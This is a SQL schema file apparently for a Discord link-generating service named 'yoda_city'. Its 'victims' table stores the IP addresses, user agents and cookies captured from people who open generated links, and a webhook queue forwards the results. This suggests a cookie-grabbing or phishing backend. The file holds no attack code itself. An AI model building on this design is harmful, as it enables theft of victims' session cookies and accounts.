CREATE DATABASE IF NOT EXISTS yoda_city;
USE yoda_city;

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    discord_id VARCHAR(64) UNIQUE NOT NULL,
    discord_username VARCHAR(128),
    discord_avatar VARCHAR(256),
    password_hash VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP NULL,
    access_token TEXT,
    refresh_token TEXT
);

CREATE TABLE IF NOT EXISTS generated_links (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    link_type ENUM('server', 'profile') NOT NULL,
    target_id VARCHAR(128) NOT NULL,
    immortal_link TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS victims (
    id INT AUTO_INCREMENT PRIMARY KEY,
    generated_link_id INT,
    victim_ip VARCHAR(45),
    victim_user_agent TEXT,
    victim_cookies TEXT,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (generated_link_id) REFERENCES generated_links(id) ON DELETE SET NULL
);

CREATE TABLE IF NOT EXISTS webhook_queue (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT DEFAULT NULL,
    payload TEXT NOT NULL,
    send_after DATETIME NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    sent TINYINT(1) DEFAULT 0
);
